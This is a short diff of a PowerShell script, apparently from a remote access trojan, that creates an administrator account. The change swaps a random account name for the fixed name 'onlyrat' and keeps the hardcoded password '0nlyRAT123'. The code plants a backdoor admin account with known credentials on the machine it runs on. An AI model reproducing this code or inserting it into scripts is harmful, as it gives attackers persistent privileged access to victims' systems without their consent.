@@ -21,7 +21,7 @@ function create_account {
     }
 }
 # create admin user
-$xf061name = random_text
+$xf061name = "onlyrat"
 $xf061pass = (ConvertTo-SecureString "0nlyRAT123" -AsPlainText -Force)
 create_account -xf061name $xf061name -xf061pass $xf061pass
 
